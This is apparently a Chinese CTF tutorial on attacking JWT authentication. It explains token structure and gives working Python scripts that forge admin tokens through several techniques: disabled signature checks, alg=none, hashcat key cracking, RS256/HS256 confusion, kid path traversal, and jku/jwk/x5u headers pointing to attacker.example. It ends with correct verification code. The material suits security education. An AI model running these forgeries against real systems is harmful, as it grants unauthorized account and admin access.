---

title: JWT
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---




# 1.JWT

JWT是一种用JSON传输的令牌，常用于身份认证。它的问题不是内容能被解码，而是签名可能被绕过——不验签名、弱密钥、算法混淆都是常见攻击方式。

JWT（JSON Web Token）是一种使用 JSON 表示身份信息和权限信息的令牌格式。

在 CTF Web 中，JWT 常用于保存：

```json
{
  "username": "guest",
  "role": "user",
  "is_admin": false
}
```

服务器把这些信息放进 JWT，交给客户端保存。客户端以后访问需要登录的接口时，再把 JWT 发送给服务器。

JWT 的安全性不在于"别人看不到内容"，而在于服务器能否通过签名判断内容有没有被修改。JWT Payload 通常只是 Base64URL 编码，并没有加密，任何拿到令牌的人都可以解码查看。

JWT 标准允许令牌被签名、使用 MAC 保护或者加密；CTF 中最常见的是使用 JWS 紧凑格式的三段式 JWT。

---

## 1.1 JWT 基础

### 1.1.1 JWT 的基本结构

常见 JWT 由三部分组成，中间使用英文句点 `.` 分隔：

```txt
Header.Payload.Signature
```

例如：

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

去掉换行后才是一个完整 JWT：

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

三部分分别是：

| 部分 | 作用 |
| ---- | ---- |
| Header | 记录令牌类型、签名算法、密钥编号等信息 |
| Payload | 保存用户名、用户 ID、权限、过期时间等数据 |
| Signature | 防止 Header 和 Payload 被修改 |

如果令牌只有两个点，一般是三段式 JWS：

```txt
第一段.第二段.第三段
```

如果令牌有四个点，也就是五段，则可能是 JWE 加密令牌：

```txt
第一段.第二段.第三段.第四段.第五段
```

JWE 和普通三段式 JWT 的结构不同，不能直接按照普通 JWS 的签名攻击思路处理。

### 1.1.2 Header

Header 一般是一个 JSON 对象。

例如：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

其中：

| 字段 | 作用 |
| ---- | ---- |
| `alg` | 指定签名或 MAC 算法 |
| `typ` | 表示令牌类型，常见值为 `JWT` |
| `kid` | 指定使用哪一个密钥 |
| `jku` | 指向保存公钥集合的 JWKS 地址 |
| `jwk` | 直接在 Header 中携带 JWK 公钥 |
| `x5u` | 指向 X.509 证书或证书链的 URL |

Header 经过 Base64URL 编码后，形成 JWT 的第一部分。

例如：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

编码后可能是：

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

Header 是用户可以修改的内容，服务器不能直接相信 Header 中的 `alg`、`kid`、`jku` 或 `jwk`。

### 1.1.3 Payload

Payload 用来保存一组 Claim，也就是令牌携带的信息。

例如：

```json
{
  "sub": "1001",
  "username": "guest",
  "role": "user",
  "is_admin": false,
  "iat": 1760000000,
  "exp": 1760003600
}
```

常见标准 Claim：

| Claim | 作用 |
| ---- | ---- |
| `iss` | Issuer，令牌签发者 |
| `sub` | Subject，令牌代表的主体或用户 |
| `aud` | Audience，令牌允许交给谁使用 |
| `exp` | Expiration Time，过期时间 |
| `nbf` | Not Before，在这个时间之前不能使用 |
| `iat` | Issued At，令牌签发时间 |
| `jti` | JWT ID，令牌的唯一编号 |

这些 Claim 不是所有 JWT 都必须包含。具体需要哪些字段，由应用自己决定。

CTF 中还经常出现自定义 Claim：

```json
{
  "username": "guest",
  "role": "user",
  "admin": false,
  "uid": 1002
}
```

常见攻击目标是：

```json
"username": "guest"
```

改成：

```json
"username": "admin"
```

或者把：

```json
"role": "user"
```

改成：

```json
"role": "admin"
```

也可能把：

```json
"is_admin": false
```

改成：

```json
"is_admin": true
```

但是修改 Payload 后，原来的签名一般会失效。只有服务器没有验证签名，或者我们能重新生成合法签名时，修改才可能生效。

### 1.1.4 Signature

Signature 用来保护 Header 和 Payload。

签名或 MAC 计算的数据是：

```txt
Base64URL(Header) + "." + Base64URL(Payload)
```

例如：

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ
```

如果使用 HS256，计算过程可以理解为：

```txt
HMAC-SHA256(
    Base64URL(Header) + "." + Base64URL(Payload),
    secret
)
```

签名结果再经过 Base64URL 编码，成为第三部分。

因此，只要 Header 或 Payload 中有一个字符发生变化，签名结果通常就会完全不同。

服务器收到 JWT 后，一般会：

1. 取出 Header 和 Payload。
2. 根据服务器预先配置的算法和密钥重新计算签名。
3. 将重新计算的签名和 JWT 第三部分比较。
4. 签名一致后，再检查过期时间、签发者、接收者和权限。
5. 所有检查通过后，才允许访问接口。

安全实现不应该直接根据用户提供的 `alg` 决定信任哪一种算法，而应该在服务器配置中固定允许使用的算法集合。

### 1.1.5 Base64URL 编码

JWT 使用的是 Base64URL，不是普通 Base64。

主要区别：

| 普通 Base64 | Base64URL |
| ---- | ---- |
| `+` | `-` |
| `/` | `_` |
| 经常保留 `=` | JWT 中通常去掉结尾的 `=` |

Base64URL 只是编码，不是加密。

看到：

```txt
eyJ1c2VybmFtZSI6ImFkbWluIn0
```

并不代表里面的数据不可读取。

手工解码脚本：

```python
import base64
import json

token = "【JWT】"

parts = token.strip().split(".")

if len(parts) != 3:
    print("当前脚本只处理常见的三段式 JWT")
    exit()

header_b64, payload_b64, signature_b64 = parts

def b64url_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)

header = json.loads(b64url_decode(header_b64))
payload = json.loads(b64url_decode(payload_b64))

print("Header:")
print(json.dumps(header, ensure_ascii=False, indent=2))

print("Payload:")
print(json.dumps(payload, ensure_ascii=False, indent=2))

print("Signature:")
print(signature_b64)
```

这个脚本只负责解码，不会验证签名。

解码成功不代表 JWT 合法。

### 1.1.6 常见签名算法

JWT 中常见算法：

| 算法 | 类型 | 签名使用 | 验证使用 |
| ---- | ---- | -------- | -------- |
| `HS256` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
| `HS384` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
| `HS512` | HMAC 对称算法 | 共享密钥 | 同一个共享密钥 |
| `RS256` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
| `RS384` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
| `RS512` | RSA 非对称算法 | RSA 私钥 | RSA 公钥 |
| `PS256` | RSA-PSS | RSA 私钥 | RSA 公钥 |
| `ES256` | ECDSA | EC 私钥 | EC 公钥 |
| `EdDSA` | EdDSA | 私钥 | 公钥 |
| `none` | 不使用签名 | 无 | 无 |

对称算法和非对称算法最大的区别是：

1. **HS 系列**

   生成令牌和验证令牌使用同一个密钥。

   ```txt
   secret
   ```

   如果密钥泄露，攻击者就可以自己签发任意令牌。

2. **RS、PS、ES、EdDSA 系列**

   服务器使用私钥签名，使用公钥验证。

   ```txt
   私钥：必须保密
   公钥：可以公开
   ```

   只拿到公钥，一般不能直接生成合法的非对称签名。

但是如果服务器把对称算法和非对称算法混在一起处理，公开的公钥可能被错误地当成 HMAC 密钥，引发算法混淆。

### 1.1.7 JWT 常见位置

JWT 常见于请求头：

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

也可能放在 Cookie 中：

```http
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

还可能出现在：

1. 登录接口的 JSON 响应。
2. 浏览器 Local Storage。
3. Session Storage。
4. URL 参数。
5. 前端 JavaScript 变量。
6. WebSocket 握手请求。
7. GraphQL 请求头。
8. 刷新令牌接口的请求体。

拿到 JWT 后，要先确认服务器真正读取的是哪个位置。

例如同时存在：

```http
Authorization: Bearer 【JWT 1】
Cookie: token=【JWT 2】
```

服务器可能只读取其中一个，也可能存在优先级问题。

修改 JWT 后没有效果，不一定是攻击失败，也可能是改错了令牌位置。

---

## 1.2 JWT 的基本分析方法

拿到 JWT 后，可以按照下面的顺序分析。

1. **判断是否为三段式 JWT**

   ```txt
   Header.Payload.Signature
   ```

2. **解码 Header**

   重点查看：

   ```json
   {
     "alg": "HS256",
     "typ": "JWT",
     "kid": "key-1"
   }
   ```

3. **解码 Payload**

   重点查找：

   ```txt
   username
   role
   admin
   is_admin
   uid
   user_id
   exp
   iss
   aud
   ```

4. **确认算法类型**

   ```txt
   HS256 → 优先检查弱密钥
   RS256 → 查找公钥、JWKS 和算法混淆
   none  → 检查是否真的允许无签名
   ```

5. **修改一个容易观察的字段**

   例如：

   ```json
   "role": "user"
   ```

   改成：

   ```json
   "role": "admin"
   ```

6. **保留原签名发送**

   如果服务器仍然接受，说明可能根本没有验证签名。

7. **测试空签名或 `alg=none`**

8. **HS 系列尝试寻找或爆破密钥**

9. **RS 系列检查算法混淆、`jku`、`jwk` 和 `kid`**

10. **检查过期时间、受众、签发者和令牌重放**

---

## 1.3 服务器未验证签名

最简单的 JWT 漏洞是服务器只解码 Payload，却没有验证 Signature。

例如后端可能写成类似：

```python
payload = jwt.decode(
    token,
    options={"verify_signature": False}
)

if payload["role"] == "admin":
    return flag
```

这段代码会读取 Payload，但关闭了签名验证。

攻击时可以把：

```json
{
  "username": "guest",
  "role": "user"
}
```

改成：

```json
{
  "username": "admin",
  "role": "admin"
}
```

然后保留原来的 Signature，或者换成任意内容。

手工生成一个修改后的 JWT：

```python
import base64
import json

original_token = "【原 JWT】"

header_b64, payload_b64, signature_b64 = original_token.split(".")

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = json.loads(
    base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4))
)

payload = json.loads(
    base64.urlsafe_b64decode(payload_b64 + "=" * (-len(payload_b64) % 4))
)

payload["username"] = "admin"
payload["role"] = "admin"

new_header = b64url_encode(
    json.dumps(header, separators=(",", ":")).encode()
)

new_payload = b64url_encode(
    json.dumps(payload, separators=(",", ":")).encode()
)

new_token = f"{new_header}.{new_payload}.{signature_b64}"

print(new_token)
```

如果服务器正确验证签名，这种修改会让签名失效。

因此，修改 Payload 后成功并不代表签名被破解了，更可能是服务器没有执行签名验证。

---

## 1.4 `alg=none` 无签名绕过

JWT 的 `none` 算法表示令牌不使用签名。

攻击思路是：

1. 把 Header 中的算法改成 `none`。
2. 修改 Payload 中的身份或权限。
3. 删除 Signature。
4. 保留第二个点，让 JWT 仍然有三部分。

Header：

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload：

```json
{
  "username": "admin",
  "role": "admin",
  "is_admin": true
}
```

最终结构：

```txt
Base64URL(Header).Base64URL(Payload).
```

注意最后仍然有一个点：

```txt
xxxxx.yyyyy.
```

生成脚本：

```python
import base64
import json

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True
}

def encode_json(data):
    raw = json.dumps(
        data,
        separators=(",", ":"),
        ensure_ascii=False
    ).encode()

    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

token = f"{encode_json(header)}.{encode_json(payload)}."

print(token)
```

有些老旧或错误实现可能还会错误处理不同大小写：

```json
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
```

但是这些写法不是通用规则。

现代 JWT 库在正确配置时通常会拒绝 `none`。服务器应该明确限制允许的算法，不能只相信令牌自己声明的 `alg`。

常见注意点：

1. `alg=none` 不是所有 JWT 都能绕过。
2. Header 中的算法通常写成小写 `none`。
3. 最后一般要保留一个点。
4. 如果服务器固定只允许 `HS256` 或 `RS256`，就会拒绝。
5. 只删除 Signature 但不修改 `alg`，和 `alg=none` 不是一回事。
6. 如果令牌过期检查仍然存在，还要考虑 `exp`。

---

## 1.5 HS 系列弱密钥

HS256 使用同一个密钥生成和验证 MAC。

例如：

```txt
secret
```

如果密钥很弱：

```txt
123456
secret
jwtsecret
admin
password
ctf
```

攻击者拿到一个 JWT 后，可以在本地不断尝试候选密钥。

这个过程不需要向服务器发送大量请求，因为每次尝试都可以在本地计算签名，再和 JWT 中的 Signature 比较。

常见密钥来源：

1. 源码中的硬编码字符串。
2. `.env` 文件。
3. Docker 环境变量。
4. 配置文件。
5. Git 泄露。
6. 备份文件。
7. 默认配置。
8. 题目名称。
9. 用户名或站点域名。
10. 常见字典。

例如源码中出现：

```python
JWT_SECRET = "secret123"
```

就可以直接使用这个密钥伪造令牌。

使用 Hashcat 爆破：

```bash
hashcat -m 16500 token.txt rockyou.txt
```

其中 `token.txt` 保存完整 JWT：

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.xxxxx
```

查看已经破解的结果：

```bash
hashcat -m 16500 token.txt --show
```

这种方法主要针对：

```txt
HS256
HS384
HS512
```

不能直接用来爆破正常 RS256 JWT 的 RSA 私钥。

拿到密钥后，可以使用 PyJWT 生成管理员令牌：

```python
import jwt
import time

secret = "【爆破出来的密钥】"

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = jwt.encode(
    payload,
    secret,
    algorithm="HS256"
)

print(token)
```

安装 PyJWT：

```bash
pip install pyjwt
```

如果原 JWT 中存在特殊 Header，例如：

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-1"
}
```

生成令牌时也可以保留：

```python
token = jwt.encode(
    payload,
    secret,
    algorithm="HS256",
    headers={
        "kid": "key-1"
    }
)
```

---

## 1.6 手工生成 HS256 JWT

为了理解 HS256 的签名过程，可以不用 PyJWT，直接使用 Python 标准库。

```python
import base64
import hashlib
import hmac
import json

secret = b"secret123"

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True
}

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_b64 = b64url_encode(
    json.dumps(
        header,
        separators=(",", ":")
    ).encode()
)

payload_b64 = b64url_encode(
    json.dumps(
        payload,
        separators=(",", ":")
    ).encode()
)

signing_input = f"{header_b64}.{payload_b64}".encode()

signature = hmac.new(
    secret,
    signing_input,
    hashlib.sha256
).digest()

signature_b64 = b64url_encode(signature)

token = f"{header_b64}.{payload_b64}.{signature_b64}"

print(token)
```

其中：

```python
separators=(",", ":")
```

用于去掉 JSON 中不必要的空格。

JWT 签名保护的是编码后的原始内容，所以这些变化都会改变签名：

1. JSON 中是否有空格。
2. 字段顺序。
3. 字符编码。
4. Base64URL 是否去掉填充。
5. Header 或 Payload 中的换行。

只要使用相同的 Header、Payload 和密钥，服务器就可以验证签名。

---

## 1.7 RS256 与 HS256 算法混淆

RS256 使用：

```txt
私钥签名
公钥验证
```

HS256 使用：

```txt
同一个密钥签名和验证
```

错误实现可能根据用户控制的 `alg` 字段选择验证方法，同时把同一份 RSA 公钥交给验证函数。

攻击流程：

1. 原令牌使用 `RS256`。
2. 服务器的 RSA 公钥可以获取。
3. 把 Header 中的 `RS256` 改成 `HS256`。
4. 把 RSA 公钥文件的完整内容当作 HMAC 密钥。
5. 使用这个"密钥"生成 HS256 Signature。
6. 如果服务器也把 RSA 公钥当成 HMAC 密钥，就会验证通过。

原 Header：

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

修改为：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload 修改为：

```json
{
  "username": "admin",
  "role": "admin",
  "is_admin": true
}
```

使用公钥作为 HMAC 密钥（完整 Python 脚本）：

```python
import base64
import hashlib
import hmac
import json

with open("public.pem", "rb") as f:
    public_key = f.read()

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True
}

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_b64 = b64url_encode(
    json.dumps(
        header,
        separators=(",", ":")
    ).encode()
)

payload_b64 = b64url_encode(
    json.dumps(
        payload,
        separators=(",", ":")
    ).encode()
)

signing_input = f"{header_b64}.{payload_b64}".encode()

signature = hmac.new(
    public_key,
    signing_input,
    hashlib.sha256
).digest()

signature_b64 = b64url_encode(signature)

token = f"{header_b64}.{payload_b64}.{signature_b64}"

print(token)
```

成功需要同时满足：

1. 原令牌使用 RSA 等非对称算法。
2. 能拿到服务器验证时使用的公钥。
3. 服务器允许从 `RS256` 切换成 `HS256`。
4. 服务器没有把对称算法和非对称算法分开。
5. 服务器错误地把 RSA 公钥当成 HMAC 密钥。
6. 使用的公钥字节和服务器读取的内容完全一致。

公钥可能出现在：

```txt
/public.pem
/static/public.pem
/.well-known/jwks.json
/jwks.json
源码
配置文件
Git 泄露
错误信息
```

公钥公开本身不是漏洞。漏洞是服务器把公开的非对称公钥错误地用于对称 HMAC 验证。

新版 JWT 库通常会阻止把 PEM 公钥当作 HMAC 密钥。本地 PyJWT 拒绝生成这种令牌时，可以使用上面的标准库脚本手工计算；但是目标服务器仍然必须存在算法混淆漏洞才能成功。

---

## 1.8 `kid` 密钥编号利用

`kid` 表示 Key ID，用来告诉服务器应该使用哪一个密钥。

例如：

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-1"
}
```

服务器可能写成：

```python
key_path = "/app/keys/" + header["kid"]
key = open(key_path, "rb").read()

jwt.decode(
    token,
    key,
    algorithms=["HS256"]
)
```

如果 `kid` 没有经过校验，就可能出现路径穿越。

例如：

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../dev/null"
}
```

拼接后可能变成：

```txt
/app/keys/../../../../dev/null
```

最终指向：

```txt
/dev/null
```

Linux 中读取 `/dev/null` 通常得到空内容。如果服务器把读取到的空内容当作 HS256 密钥，就可以尝试使用空密钥签名。

```python
secret = b""
```

把前面的 HS256 脚本中的密钥改成空字节即可：

```python
signature = hmac.new(
    b"",
    signing_input,
    hashlib.sha256
).digest()
```

成功需要满足：

1. `kid` 被直接拼接到文件路径。
2. 路径穿越没有被过滤。
3. 服务器成功读取 `/dev/null`。
4. 读取结果被直接当成 HMAC 密钥。
5. 服务器允许空密钥或没有检查密钥长度。

`kid` 还可能进入：

1. SQL 查询。
2. NoSQL 查询。
3. LDAP 查询。
4. Redis Key。
5. 文件名。
6. 字典索引。
7. 命令行参数。

例如后端可能写成：

```sql
select secret from jwt_keys where kid = '用户输入'
```

这时 `kid` 可能变成 SQL 注入点。

但是不能看到 `kid` 就直接认定存在漏洞。正常实现可能只是：

```python
keys = {
    "key-1": key1,
    "key-2": key2
}
```

然后严格判断 `kid` 是否在白名单中。

---

## 1.9 `jku` Header 注入

`jku` 表示 JWK Set URL，用于告诉服务器去哪里获取一组公钥。

正常 Header：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "server-key-1",
  "jku": "https://target/.well-known/jwks.json"
}
```

如果服务器直接相信用户控制的 `jku`，攻击者可以尝试改成自己的服务器：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "ctf-key",
  "jku": "https://attacker.example/jwks.json"
}
```

攻击流程：

1. 攻击者生成一对 RSA 密钥。
2. 使用自己的私钥签发管理员 JWT。
3. 把自己的公钥转换成 JWK。
4. 把 JWK 放入 `jwks.json`。
5. 在 Header 中把 `jku` 指向攻击者的 `jwks.json`。
6. 保证 JWT Header 的 `kid` 和 JWKS 中的 `kid` 相同。
7. 如果服务器信任这个地址，就可能使用攻击者公钥验证攻击者签名。

生成 RSA 密钥：

```bash
openssl genpkey \
  -algorithm RSA \
  -pkeyopt rsa_keygen_bits:2048 \
  -out private.pem
```

导出公钥：

```bash
openssl pkey \
  -in private.pem \
  -pubout \
  -out public.pem
```

使用 PyJWT 生成 JWK 和伪造令牌（完整脚本）：

```python
import json
import jwt

from jwt.algorithms import RSAAlgorithm

with open("private.pem", "rb") as f:
    private_key = f.read()

with open("public.pem", "rb") as f:
    public_key = f.read()

jwk = json.loads(
    RSAAlgorithm.to_jwk(public_key)
)

jwk["kid"] = "ctf-key"
jwk["use"] = "sig"
jwk["alg"] = "RS256"

jwks = {
    "keys": [
        jwk
    ]
}

with open("jwks.json", "w", encoding="utf-8") as f:
    json.dump(jwks, f)

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True
}

headers = {
    "kid": "ctf-key",
    "jku": "https://attacker.example/jwks.json"
}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)

print(token)
```

生成的 `jwks.json` 大致是：

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "ctf-key",
      "use": "sig",
      "alg": "RS256",
      "n": "【RSA 模数】",
      "e": "AQAB"
    }
  ]
}
```

成功需要满足：

1. 服务器会读取 JWT Header 中的 `jku`。
2. 服务器允许访问攻击者控制的 URL。
3. 服务器没有固定可信的 JWKS 域名。
4. 服务器会使用返回的公钥验证令牌。
5. Header 的 `kid` 能匹配 JWKS 中的密钥。
6. 攻击者服务器能被目标访问。

即使不能伪造 JWT，任意 `jku` 也可能造成 SSRF，因为目标服务器会根据用户提供的 URL 发起请求。

---

## 1.10 `jwk` Header 注入

`jwk` 允许直接在 JWT Header 中携带公钥。

正常设计中，服务器不应该无条件相信用户自己提供的验证公钥。

攻击 Header 可能类似：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "ctf-key",
  "jwk": {
    "kty": "RSA",
    "kid": "ctf-key",
    "use": "sig",
    "alg": "RS256",
    "n": "【攻击者公钥的 RSA 模数】",
    "e": "AQAB"
  }
}
```

如果服务器直接使用 Header 中的 `jwk` 验证当前 JWT，就相当于允许攻击者说：

```txt
请使用我自己提供的公钥验证我自己生成的签名
```

攻击者使用对应私钥签名后，验证自然能够通过。

使用前面生成的 `jwk`：

```python
headers = {
    "kid": "ctf-key",
    "jwk": jwk
}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)

print(token)
```

成功前提：

1. 服务器支持 Header 中的 `jwk`。
2. 服务器没有判断该公钥是否可信。
3. 服务器直接用攻击者提供的公钥验证签名。
4. `alg`、`kid` 和密钥类型能够匹配。

如果服务器只使用本地保存的公钥，Header 中增加 `jwk` 不会产生效果。

---

## 1.11 `x5u` Header 注入

`x5u` 指向 X.509 证书或证书链的位置。

例如：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "ctf-key",
  "x5u": "https://attacker.example/cert.pem"
}
```

如果服务器直接访问这个 URL，并使用返回的证书公钥验证 JWT，可能产生和 `jku` 类似的问题：

1. 攻击者提供自己的证书和私钥。
2. 使用私钥签发管理员 JWT。
3. 让 `x5u` 指向攻击者证书。
4. 服务器错误地信任证书中的公钥。
5. 攻击者签名验证通过。

同时，任意 `x5u` 也可能引发 SSRF。

`jku`、`jwk`、`x5u` 的共同核心是：

```txt
服务器是否信任了攻击者提供的验证密钥或密钥来源
```

---

## 1.12 Claim 校验不完整

即使签名验证正确，服务器仍然需要校验 Payload 中的重要 Claim。

### 1.12.1 `exp` 过期时间

例如：

```json
{
  "exp": 1760000000
}
```

`exp` 一般是 Unix 时间戳。

查看当前 Unix 时间戳：

```python
import time

print(int(time.time()))
```

如果：

```txt
当前时间 > exp
```

令牌应该被视为过期。

常见错误：

1. 服务器完全不检查 `exp`。
2. 服务器只在 `exp` 存在时检查，但不要求必须存在。
3. 删除 `exp` 后令牌反而永久有效。
4. 把毫秒和秒混用。
5. 使用字符串时间，导致比较异常。
6. 允许过大的时间偏移。

测试时可以尝试：

```json
{
  "exp": 4102444800
}
```

但是修改 `exp` 后仍然需要合法签名，除非服务器没有验证签名或者已经能够伪造令牌。

### 1.12.2 `nbf`

`nbf` 表示在指定时间之前不能使用。

```json
{
  "nbf": 1760000000
}
```

如果服务器不验证 `nbf`，可能提前使用本应尚未生效的令牌。

### 1.12.3 `iss`

`iss` 表示令牌签发者。

```json
{
  "iss": "https://auth.target"
}
```

服务器如果只验证签名，不验证签发者，可能接受由另一个系统使用相同密钥签发的 JWT。

### 1.12.4 `aud`

`aud` 表示令牌面向的接收者。

```json
{
  "aud": "admin-api"
}
```

如果服务器不验证 `aud`，原本给普通 API 使用的令牌可能被拿到管理 API 使用。

### 1.12.5 `jti`

`jti` 是 JWT 的唯一编号。

```json
{
  "jti": "55efb8b1-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

服务器可以记录已经使用、注销或撤销的 `jti`。

但是仅仅在 JWT 中放入 `jti`，不会自动防止重放。服务器必须在后端保存状态并执行检查。

---

## 1.13 JWT 重放攻击

JWT 签名只能证明令牌没有被修改，不能阻止别人复制这个令牌。

如果攻击者得到一个合法管理员 JWT：

```txt
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

只要令牌仍然有效，就可能直接重复发送。

常见泄露来源：

1. XSS 窃取。
2. 日志泄露。
3. URL 中携带 JWT。
4. Git 或备份文件泄露。
5. 管理员 Bot 请求泄露。
6. 不安全的 HTTP 传输。
7. 浏览器 Local Storage 被读取。
8. 错误信息输出完整请求头。

使用：

```bash
curl "http://target/admin" \
  -H "Authorization: Bearer 【管理员 JWT】"
```

即使不知道密钥，也不需要修改令牌，因为原令牌本身已经具有管理员权限。

`exp` 只能限制令牌可以重放多长时间，不能阻止有效期内的重放。

---

## 1.14 Access Token、Refresh Token 和 ID Token 混淆

一个系统可能同时使用：

```txt
Access Token
Refresh Token
ID Token
```

它们的结构都可能是 JWT，但用途不同。

| 类型 | 常见作用 |
| ---- | -------- |
| Access Token | 访问 API |
| Refresh Token | 换取新的 Access Token |
| ID Token | 向客户端描述登录用户身份 |

如果服务器只验证签名，不检查 `typ`、`aud`、`iss` 或用途，可能把一种令牌错误地当成另一种使用。

例如把 Refresh Token 直接发送给管理接口：

```http
Authorization: Bearer 【Refresh Token】
```

如果管理接口只检查签名，可能错误接受。

不同用途的令牌应该采用能够互相区分的验证规则，例如：

1. 不同的 `typ`。
2. 不同的 `aud`。
3. 不同的 `iss`。
4. 不同的密钥。
5. 不同的必需 Claim。
6. 不同的验证入口。

---

## 1.15 使用 PyJWT 分析和验证令牌

安装：

```bash
pip install pyjwt
```

读取 Header，但不验证签名：

```python
import jwt

token = "【JWT】"

header = jwt.get_unverified_header(token)

print(header)
```

读取 Payload，但不验证签名：

```python
import jwt

token = "【JWT】"

payload = jwt.decode(
    token,
    options={
        "verify_signature": False
    }
)

print(payload)
```

这种写法只能用于本地分析。

不能在服务器身份认证代码中这样写：

```python
jwt.decode(
    token,
    options={
        "verify_signature": False
    }
)
```

正确验证 HS256：

```python
import jwt

token = "【JWT】"
secret = "【服务器密钥】"

payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"]
)

print(payload)
```

同时要求必须包含 `exp`：

```python
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],
    options={
        "require": ["exp"]
    }
)
```

验证签发者和接收者：

```python
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],
    issuer="https://auth.target",
    audience="admin-api",
    options={
        "require": [
            "exp",
            "iat",
            "iss",
            "aud"
        ]
    }
)
```

`algorithms` 应由服务器固定配置，不能直接使用 JWT Header 中的 `alg` 来生成允许列表。

错误写法类似：

```python
header = jwt.get_unverified_header(token)

payload = jwt.decode(
    token,
    key,
    algorithms=[header["alg"]]
)
```

这里的 `header["alg"]` 来自攻击者控制的 JWT，不能用它决定服务器允许的算法。

JWT 题目的核心不是看到 Payload 后直接修改，而是判断服务器到底信任了什么：

```txt
是否验证 Signature
允许哪些算法
密钥从哪里获取
是否信任 Header
是否校验关键 Claim
是否允许令牌重放
```

只要其中一个信任边界处理错误，就可能把普通用户 JWT 变成管理员 JWT。
